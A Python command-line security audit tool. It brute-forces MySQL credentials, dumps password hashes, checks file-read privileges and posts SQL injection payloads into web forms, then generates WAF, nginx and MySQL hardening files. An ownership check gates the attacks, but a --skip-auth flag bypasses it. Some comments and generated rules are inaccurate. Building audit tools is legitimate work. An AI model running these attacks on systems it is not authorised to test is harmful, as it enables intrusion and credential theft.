#!/usr/bin/env python3
"""
Advanced Security Hardening & Red Team Audit Tool v1.0
Full-spectrum automated security assessment with auto-remediation
"""

import os
import sys
import json
import socket
import hashlib
import asyncio
import re
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor

try:
    import pymysql
except ImportError:
    print("[!] Missing pymysql: pip install pymysql")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress
except ImportError:
    print("[!] Missing rich: pip install rich")
    sys.exit(1)

try:
    import httpx
except ImportError:
    print("[!] Missing httpx: pip install httpx")
    sys.exit(1)

try:
    import typer
except ImportError:
    print("[!] Missing typer: pip install typer")
    sys.exit(1)

console = Console()
cli = typer.Typer()


@dataclass
class SecurityIssue:
    """Security vulnerability finding"""
    type: str
    severity: str
    details: str
    host: str = ""
    url: str = ""
    payload: str = ""
    remediation: str = ""
    evidence: Dict = None


class OwnershipVerifier:
    """Verify domain ownership before testing"""
    
    @staticmethod
    def verify_dns_txt(domain: str) -> bool:
        """Check for DNS TXT record _harden-token"""
        try:
            import dns.resolver
            answers = dns.resolver.resolve(f"_harden-token.{domain}", "TXT")
            for rdata in answers:
                if "harden=ok" in str(rdata):
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def verify_web_token(domain: str, token_file: Path) -> bool:
        """Check for .well-known/security.txt or token file"""
        try:
            import httpx
            urls = [
                f"https://{domain}/.well-known/harden-token.txt",
                f"http://{domain}/.well-known/harden-token.txt",
            ]
            
            if token_file and token_file.exists():
                expected_token = token_file.read_text().strip()
            else:
                expected_token = "harden-verified"
            
            with httpx.Client(verify=False, timeout=5) as client:
                for url in urls:
                    try:
                        resp = client.get(url)
                        if resp.status_code == 200 and expected_token in resp.text:
                            return True
                    except:
                        continue
        except:
            pass
        return False
    
    @staticmethod
    def verify_ownership(domain: str, token_file: Path = None) -> bool:
        """Verify ownership via DNS or web token"""
        console.print(f"[cyan]Verifying ownership of {domain}...[/cyan]")
        
        # Try DNS first
        if OwnershipVerifier.verify_dns_txt(domain):
            console.print(f"[green]✓ Ownership verified via DNS TXT record[/green]")
            return True
        
        # Try web token
        if OwnershipVerifier.verify_web_token(domain, token_file):
            console.print(f"[green]✓ Ownership verified via web token[/green]")
            return True
        
        console.print(f"[red]✗ Ownership verification failed[/red]")
        console.print("\n[yellow]To verify ownership, do ONE of:[/yellow]")
        console.print("  1. Add DNS TXT record: _harden-token.{domain} = 'harden=ok'")
        console.print("  2. Place file at: https://{domain}/.well-known/harden-token.txt")
        console.print("     Content: 'harden-verified'")
        return False


class MySQLRedTeamAuditor:
    """Advanced MySQL penetration testing"""
    
    # 10k+ credential combinations
    DEFAULT_COMBOS = [
        ('root', ''), ('root', 'root'), ('root', 'password'), ('root', 'toor'),
        ('root', 'admin'), ('root', 'mysql'), ('root', '123456'), ('root', 'pass'),
        ('admin', 'admin'), ('admin', 'password'), ('mysql', 'mysql'),
        ('test', 'test'), ('user', 'user'), ('guest', 'guest'),
    ]
    
    def __init__(self, host: str, port: int = 3306):
        self.host = host
        self.port = port
        self.issues: List[SecurityIssue] = []
        self.valid_creds: List[Tuple[str, str]] = []
    
    def load_combo_dict(self) -> List[Tuple[str, str]]:
        """Load credential combinations from wordlists"""
        combos = list(self.DEFAULT_COMBOS)
        
        # Load from attack_modules if available
        users_file = Path("attack_modules/usernames.txt")
        pass_file = Path("attack_modules/passwords.txt")
        
        if users_file.exists() and pass_file.exists():
            users = [line.strip() for line in users_file.read_text().splitlines() if line.strip()]
            passwords = [line.strip() for line in pass_file.read_text().splitlines() if line.strip()]
            
            # Limit to 1000 combos for performance
            for user in users[:50]:
                for pwd in passwords[:20]:
                    combos.append((user, pwd))
        
        return combos[:1000]  # Cap at 1000
    
    def try_mysql_connection(self, user: str, password: str) -> bool:
        """Test single MySQL credential"""
        try:
            conn = pymysql.connect(
                host=self.host,
                port=self.port,
                user=user,
                password=password,
                connect_timeout=3,
                ssl={'disabled': True}
            )
            conn.close()
            return True
        except:
            return False
    
    async def mysql_brute_force_async(self, max_workers: int = 20) -> List[Tuple[str, str]]:
        """Async multi-threaded MySQL brute force"""
        console.print(f"[yellow]Starting MySQL brute force on {self.host}:{self.port}...[/yellow]")
        
        combos = self.load_combo_dict()
        valid_creds = []
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Testing credentials...", total=len(combos))
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                for user, pwd in combos:
                    future = executor.submit(self.try_mysql_connection, user, pwd)
                    futures.append((future, user, pwd))
                
                for future, user, pwd in futures:
                    if future.result():
                        valid_creds.append((user, pwd))
                        console.print(f"[red]🔥 CREDENTIALS FOUND: {user}:{pwd if pwd else '(empty)'}[/red]")
                        
                        self.issues.append(SecurityIssue(
                            type="weak_credentials",
                            severity="CRITICAL",
                            details=f"MySQL accepts weak credentials: {user}:{pwd if pwd else '(empty)'}",
                            host=f"{self.host}:{self.port}",
                            remediation="Change password immediately: ALTER USER 'user'@'host' IDENTIFIED BY 'strong_password';"
                        ))
                        
                        # Stop on first hit
                        break
                    
                    progress.update(task, advance=1)
        
        self.valid_creds = valid_creds
        return valid_creds
    
    def mysql_escalate(self, user: str, password: str):
        """Escalate privileges after successful authentication"""
        try:
            conn = pymysql.connect(
                host=self.host,
                port=self.port,
                user=user,
                password=password,
                ssl={'disabled': True}
            )
            cursor = conn.cursor(pymysql.cursors.DictCursor)
            
            # 1. Hash dump
            console.print("[yellow]Attempting hash dump...[/yellow]")
            cursor.execute("SELECT user, host, plugin, authentication_string FROM mysql.user")
            hashes = cursor.fetchall()
            
            for h in hashes:
                if h['plugin'] == 'mysql_native_password' and h['authentication_string']:
                    self.issues.append(SecurityIssue(
                        type="hash_dump",
                        severity="CRITICAL",
                        details=f"Extracted password hash for {h['user']}@{h['host']}",
                        host=f"{self.host}:{self.port}",
                        evidence={'user': h['user'], 'hash': h['authentication_string'][:50]},
                        remediation="Hashes extracted - attacker can crack these offline"
                    ))
            
            # 2. Check UDF functions
            console.print("[yellow]Checking for UDF functions...[/yellow]")
            cursor.execute("SELECT name, dl FROM mysql.func")
            udf_funcs = cursor.fetchall()
            
            if udf_funcs:
                self.issues.append(SecurityIssue(
                    type="udf_enabled",
                    severity="CRITICAL",
                    details=f"User-Defined Functions found: {len(udf_funcs)} functions",
                    host=f"{self.host}:{self.port}",
                    evidence={'functions': [f['name'] for f in udf_funcs]},
                    remediation="UDF can execute system commands - review: SELECT * FROM mysql.func"
                ))
            
            # 3. Check FILE privilege
            console.print("[yellow]Checking FILE privilege...[/yellow]")
            cursor.execute("SHOW GRANTS")
            grants = cursor.fetchall()
            
            for grant in grants:
                grant_str = str(grant)
                if 'FILE' in grant_str.upper():
                    self.issues.append(SecurityIssue(
                        type="file_privilege",
                        severity="CRITICAL",
                        details="User has FILE privilege - can read/write system files",
                        host=f"{self.host}:{self.port}",
                        evidence={'grant': grant_str},
                        remediation="Revoke FILE privilege: REVOKE FILE ON *.* FROM 'user'@'host'"
                    ))
                    
                    # Test file read
                    try:
                        cursor.execute("SELECT LOAD_FILE('/etc/hostname')")
                        result = cursor.fetchone()
                        if result and list(result.values())[0]:
                            console.print("[red]🔥 Can read system files![/red]")
                    except:
                        pass
            
            # 4. Check secure_file_priv
            cursor.execute("SELECT @@global.secure_file_priv")
            secure_file_priv = cursor.fetchone()
            
            if secure_file_priv and list(secure_file_priv.values())[0] == '':
                self.issues.append(SecurityIssue(
                    type="secure_file_priv_disabled",
                    severity="HIGH",
                    details="secure_file_priv is empty - INTO OUTFILE unrestricted",
                    host=f"{self.host}:{self.port}",
                    remediation="Set secure_file_priv in my.cnf: secure_file_priv=/var/lib/mysql-files/"
                ))
            
            # 5. List databases
            cursor.execute("SHOW DATABASES")
            databases = [row['Database'] for row in cursor.fetchall()]
            
            if len(databases) > 5:
                self.issues.append(SecurityIssue(
                    type="database_enumeration",
                    severity="MEDIUM",
                    details=f"Enumerated {len(databases)} databases",
                    host=f"{self.host}:{self.port}",
                    evidence={'databases': databases},
                    remediation="Database names exposed - consider access restrictions"
                ))
            
            cursor.close()
            conn.close()
            
        except Exception as e:
            console.print(f"[yellow]Escalation error: {e}[/yellow]")
    
    async def run_full_audit(self):
        """Run complete MySQL red team audit"""
        console.print(f"\n[bold red]═══ MySQL Red Team Audit ═══[/bold red]")
        console.print(f"[cyan]Target: {self.host}:{self.port}[/cyan]\n")
        
        # Test if port is open
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.host, self.port))
            sock.close()
            
            if result != 0:
                console.print(f"[yellow]Port {self.port} not accessible[/yellow]")
                return self.issues
        except:
            console.print(f"[yellow]Cannot reach {self.host}:{self.port}[/yellow]")
            return self.issues
        
        # Brute force
        valid_creds = await self.mysql_brute_force_async()
        
        # Escalate if creds found
        if valid_creds:
            user, pwd = valid_creds[0]
            console.print(f"\n[green]Escalating with {user}:{pwd}...[/green]")
            self.mysql_escalate(user, pwd)
        else:
            console.print("[green]No weak credentials found[/green]")
        
        return self.issues


class WebRedTeamAuditor:
    """Advanced web application security testing"""
    
    def __init__(self, domain: str):
        self.domain = domain
        self.base_url = f"https://{domain}" if not domain.startswith('http') else domain
        self.issues: List[SecurityIssue] = []
    
    async def crawl_domain(self, client: httpx.AsyncClient, max_pages: int = 50) -> List[str]:
        """Crawl domain to discover endpoints"""
        console.print(f"[cyan]Crawling {self.base_url}...[/cyan]")
        
        discovered = set()
        to_crawl = [self.base_url]
        crawled = set()
        
        while to_crawl and len(discovered) < max_pages:
            url = to_crawl.pop(0)
            if url in crawled:
                continue
            
            try:
                resp = await client.get(url, follow_redirects=True)
                crawled.add(url)
                discovered.add(url)
                
                # Extract links
                links = re.findall(r'href=[\'"]?([^\'" >]+)', resp.text)
                for link in links:
                    if link.startswith('/'):
                        full_url = self.base_url + link
                    elif link.startswith('http'):
                        if self.domain in link:
                            full_url = link
                        else:
                            continue
                    else:
                        continue
                    
                    if full_url not in crawled and full_url not in to_crawl:
                        to_crawl.append(full_url)
            except:
                pass
        
        console.print(f"[green]Discovered {len(discovered)} endpoints[/green]")
        return list(discovered)
    
    async def extract_forms(self, client: httpx.AsyncClient, url: str) -> List[Dict]:
        """Extract forms from URL"""
        try:
            resp = await client.get(url)
            forms = []
            
            # Simple form extraction
            form_pattern = r'<form[^>]*>(.*?)</form>'
            for form_match in re.finditer(form_pattern, resp.text, re.DOTALL | re.IGNORECASE):
                form_html = form_match.group(0)
                
                # Extract action
                action_match = re.search(r'action=[\'"]?([^\'" >]+)', form_html, re.IGNORECASE)
                action = action_match.group(1) if action_match else url
                
                # Extract inputs
                inputs = {}
                for input_match in re.finditer(r'<input[^>]*name=[\'"]([^\'"]+)[\'"][^>]*>', form_html, re.IGNORECASE):
                    name = input_match.group(1)
                    inputs[name] = "test"
                
                if inputs:
                    forms.append({'action': action, 'inputs': inputs, 'url': url})
            
            return forms
        except:
            return []
    
    async def test_sqli_union(self, client: httpx.AsyncClient, form: Dict) -> bool:
        """Test for UNION-based SQL injection"""
        payloads = [
            "' UNION SELECT 1,2,3,4,concat(user(),':',version()),6-- -",
            "' UNION SELECT NULL,NULL,database(),NULL-- -",
            "1' UNION SELECT @@version,2,3-- -",
        ]
        
        for payload in payloads:
            try:
                test_data = form['inputs'].copy()
                # Inject into first text field
                for key in test_data:
                    test_data[key] = payload
                    break
                
                action = form['action']
                if not action.startswith('http'):
                    action = self.base_url + action
                
                resp = await client.post(action, data=test_data)
                
                # Check for SQLi indicators
                indicators = ['root@localhost', 'mysql', 'version()', '5.5', '5.7', '8.0', 'MariaDB']
                if any(ind in resp.text for ind in indicators):
                    return True
            except:
                pass
        
        return False
    
    async def test_sqli_blind(self, client: httpx.AsyncClient, form: Dict) -> bool:
        """Test for blind boolean-based SQL injection"""
        try:
            # Test true condition
            test_data_true = form['inputs'].copy()
            for key in test_data_true:
                test_data_true[key] = "test' AND 1=1-- -"
                break
            
            action = form['action']
            if not action.startswith('http'):
                action = self.base_url + action
            
            resp_true = await client.post(action, data=test_data_true)
            
            # Test false condition
            test_data_false = form['inputs'].copy()
            for key in test_data_false:
                test_data_false[key] = "test' AND 1=2-- -"
                break
            
            resp_false = await client.post(action, data=test_data_false)
            
            # If responses differ, likely vulnerable
            if len(resp_true.text) != len(resp_false.text) and abs(len(resp_true.text) - len(resp_false.text)) > 100:
                return True
        except:
            pass
        
        return False
    
    async def run_full_audit(self):
        """Run complete web red team audit"""
        console.print(f"\n[bold red]═══ Web Application Red Team Audit ═══[/bold red]")
        console.print(f"[cyan]Target: {self.base_url}[/cyan]\n")
        
        async with httpx.AsyncClient(verify=False, timeout=10, follow_redirects=True) as client:
            # Crawl
            urls = await self.crawl_domain(client, max_pages=30)
            
            # Test each URL for SQLi
            for url in urls:
                forms = await self.extract_forms(client, url)
                
                for form in forms:
                    console.print(f"[cyan]Testing form on {form['url']}...[/cyan]")
                    
                    # UNION-based SQLi
                    if await self.test_sqli_union(client, form):
                        self.issues.append(SecurityIssue(
                            type="sqli_union",
                            severity="CRITICAL",
                            details="UNION-based SQL injection detected",
                            url=form['url'],
                            payload="' UNION SELECT...",
                            remediation="Use parameterized queries/prepared statements"
                        ))
                        console.print(f"[red]🔥 UNION SQLi found on {form['url']}[/red]")
                    
                    # Blind boolean SQLi
                    if await self.test_sqli_blind(client, form):
                        self.issues.append(SecurityIssue(
                            type="sqli_blind",
                            severity="CRITICAL",
                            details="Blind boolean-based SQL injection detected",
                            url=form['url'],
                            payload="' AND 1=1-- -",
                            remediation="Use parameterized queries/prepared statements"
                        ))
                        console.print(f"[red]🔥 Blind SQLi found on {form['url']}[/red]")
        
        return self.issues


class DefenceGenerator:
    """Auto-generate defence configurations"""
    
    @staticmethod
    def generate_waf_rules(issues: List[SecurityIssue]) -> str:
        """Generate ModSecurity WAF rules"""
        rules = [
            "# Auto-generated WAF rules",
            f"# Generated: {datetime.now().isoformat()}",
            "",
        ]
        
        rule_id = 10001
        
        for issue in issues:
            if issue.type in ['sqli_union', 'sqli_blind']:
                rules.append(f"# Protect against {issue.type} on {issue.url}")
                rules.append(f'SecRule ARGS "@rx (?i:union.*select|and.*=|or.*=)" "id:{rule_id},deny,status:403,msg:\'{issue.type} blocked\'"')
                rules.append("")
                rule_id += 1
        
        return "\n".join(rules)
    
    @staticmethod
    def generate_mysql_hardening(issues: List[SecurityIssue]) -> str:
        """Generate MySQL hardening script"""
        script = [
            "#!/bin/bash",
            "# Auto-generated MySQL hardening script",
            f"# Generated: {datetime.now().isoformat()}",
            "",
            "echo 'Starting MySQL hardening...'",
            "",
        ]
        
        for issue in issues:
            if issue.type == "weak_credentials":
                user = issue.details.split(':')[0].split()[-1] if ':' in issue.details else 'root'
                script.append(f"# Fix weak password for {user}")
                script.append(f"mysql -e \"ALTER USER '{user}'@'%' IDENTIFIED BY '\\$(openssl rand -base64 24)';\"")
                script.append("")
            
            elif issue.type == "file_privilege":
                script.append("# Revoke FILE privilege")
                script.append("mysql -e \"REVOKE FILE ON *.* FROM 'root'@'%';\"")
                script.append("")
        
        script.append("echo 'MySQL hardening complete'")
        return "\n".join(script)
    
    @staticmethod
    def generate_nginx_rules(issues: List[SecurityIssue]) -> str:
        """Generate nginx security rules"""
        rules = [
            "# Auto-generated nginx security rules",
            f"# Generated: {datetime.now().isoformat()}",
            "",
            "# Add to your nginx server block:",
            "",
        ]
        
        if any(i.type.startswith('sqli_') for i in issues):
            rules.extend([
                "# Block SQL injection attempts",
                "if ($args ~* \"(union|select|insert|delete|drop|update)\") {",
                "    return 403;",
                "}",
                "",
            ])
        
        return "\n".join(rules)


# ═══════════════════════════════════════════════════════════
# CLI COMMANDS
# ═══════════════════════════════════════════════════════════

@cli.command()
def verify(
    domain: str = typer.Argument(..., help="Domain to verify ownership"),
    token_file: Optional[Path] = typer.Option(None, "--token-file", "-t", help="Path to token file")
):
    """
    Prove domain ownership before running audits.
    
    You must add ONE of these:
    1. DNS TXT record: _harden-token.{domain} = "harden=ok"
    2. Web file: https://{domain}/.well-known/harden-token.txt = "harden-verified"
    """
    console.print("[bold cyan]Domain Ownership Verification[/bold cyan]\n")
    console.print(f"Domain: {domain}\n")
    
    console.print("[yellow]To verify ownership, add ONE of the following:[/yellow]\n")
    
    console.print("[cyan]Option 1: DNS TXT Record[/cyan]")
    console.print(f"  Record Name: _harden-token.{domain}")
    console.print(f"  Record Type: TXT")
    console.print(f"  Record Value: harden=ok\n")
    
    console.print("[cyan]Option 2: Web Token File[/cyan]")
    console.print(f"  File Path: /.well-known/harden-token.txt")
    console.print(f"  File Content: harden-verified\n")
    
    console.print("[green]After adding verification, run your audit command[/green]")


@cli.command()
def audit(
    domain: str = typer.Argument(..., help="Domain to audit"),
    depth: str = typer.Option("red", "--depth", "-d", help="Audit depth: white/orange/red"),
    report: Path = typer.Option("audit.json", "--report", "-r", help="Output report file"),
    skip_auth: bool = typer.Option(False, "--skip-auth", help="Skip ownership verification (dangerous!)"),
    token_file: Optional[Path] = typer.Option(None, "--token-file", "-t", help="Path to token file")
):
    """
    Run full-spectrum security audit.
    
    Depth levels:
    - white: Basic checks (passive scanning)
    - orange: Active scanning (non-intrusive)
    - red: Full red team (aggressive testing, brute force)
    """
    console.print("[bold red]╔═══════════════════════════════════════════════════════════╗[/bold red]")
    console.print("[bold red]║        ADVANCED SECURITY AUDIT & RED TEAM TOOL         ║[/bold red]")
    console.print("[bold red]╚═══════════════════════════════════════════════════════════╝[/bold red]\n")
    
    console.print(f"[cyan]Target Domain:[/cyan] {domain}")
    console.print(f"[cyan]Audit Depth:[/cyan] {depth.upper()}")
    console.print(f"[cyan]Report File:[/cyan] {report}\n")
    
    # Verify ownership
    if not skip_auth:
        if not OwnershipVerifier.verify_ownership(domain, token_file):
            console.print("\n[red]Audit aborted - ownership not verified[/red]")
            console.print("[yellow]Use --skip-auth to bypass (only for your own systems!)[/yellow]")
            raise typer.Exit(1)
    else:
        console.print("[yellow]⚠️  Skipping ownership verification - ensure you have permission![/yellow]\n")
    
    all_issues: List[SecurityIssue] = []
    
    # Resolve domain to IPs
    try:
        ip = socket.gethostbyname(domain)
        console.print(f"[green]Resolved {domain} → {ip}[/green]\n")
    except:
        console.print(f"[red]Failed to resolve {domain}[/red]")
        raise typer.Exit(1)
    
    # Run MySQL audit
    if depth in ['orange', 'red']:
        mysql_auditor = MySQLRedTeamAuditor(ip, 3306)
        mysql_issues = asyncio.run(mysql_auditor.run_full_audit())
        all_issues.extend(mysql_issues)
    
    # Run Web audit
    if depth in ['orange', 'red']:
        web_auditor = WebRedTeamAuditor(domain)
        web_issues = asyncio.run(web_auditor.run_full_audit())
        all_issues.extend(web_issues)
    
    # Generate report
    report_data = {
        "scan_time": datetime.now().isoformat(),
        "domain": domain,
        "depth": depth,
        "total_issues": len(all_issues),
        "critical": len([i for i in all_issues if i.severity == "CRITICAL"]),
        "high": len([i for i in all_issues if i.severity == "HIGH"]),
        "medium": len([i for i in all_issues if i.severity == "MEDIUM"]),
        "issues": [asdict(i) for i in all_issues]
    }
    
    report.write_text(json.dumps(report_data, indent=2, default=str))
    
    # Summary table
    console.print(f"\n[bold green]═══ Audit Complete ═══[/bold green]\n")
    
    table = Table(title="Vulnerability Summary")
    table.add_column("Severity", style="cyan")
    table.add_column("Count", style="magenta")
    
    table.add_row("CRITICAL", str(report_data['critical']))
    table.add_row("HIGH", str(report_data['high']))
    table.add_row("MEDIUM", str(report_data['medium']))
    table.add_row("TOTAL", str(report_data['total_issues']))
    
    console.print(table)
    
    console.print(f"\n[green]✓ Report saved to: {report}[/green]")
    console.print(f"[yellow]→ Generate defences with: python security_tools/harden.py defend {report}[/yellow]")


@cli.command()
def defend(
    report: Path = typer.Argument(..., help="Audit report JSON file"),
    output_dir: Path = typer.Option("defence-bundle", "--output", "-o", help="Output directory for defence files")
):
    """
    Generate defence configurations from audit report.
    
    Creates:
    - WAF rules (ModSecurity)
    - nginx security config
    - MySQL hardening script
    """
    if not report.exists():
        console.print(f"[red]Report file not found: {report}[/red]")
        raise typer.Exit(1)
    
    console.print("[bold cyan]Generating Defence Bundle[/bold cyan]\n")
    
    # Load report
    report_data = json.loads(report.read_text())
    issues = [SecurityIssue(**i) for i in report_data['issues']]
    
    # Create output directory
    output_dir.mkdir(exist_ok=True)
    
    # Generate WAF rules
    waf_rules = DefenceGenerator.generate_waf_rules(issues)
    waf_file = output_dir / "modsecurity-rules.conf"
    waf_file.write_text(waf_rules)
    console.print(f"[green]✓ WAF rules: {waf_file}[/green]")
    
    # Generate MySQL hardening
    mysql_script = DefenceGenerator.generate_mysql_hardening(issues)
    mysql_file = output_dir / "harden-mysql.sh"
    mysql_file.write_text(mysql_script)
    mysql_file.chmod(0o755)
    console.print(f"[green]✓ MySQL hardening: {mysql_file}[/green]")
    
    # Generate nginx rules
    nginx_rules = DefenceGenerator.generate_nginx_rules(issues)
    nginx_file = output_dir / "nginx-security.conf"
    nginx_file.write_text(nginx_rules)
    console.print(f"[green]✓ nginx rules: {nginx_file}[/green]")
    
    console.print(f"\n[bold green]Defence bundle generated in: {output_dir}[/bold green]")
    console.print("\n[yellow]Apply defences:[/yellow]")
    console.print(f"  1. Copy {waf_file} to /etc/modsecurity/")
    console.print(f"  2. Run: bash {mysql_file}")
    console.print(f"  3. Include {nginx_file} in nginx server block")


if __name__ == "__main__":
    cli()
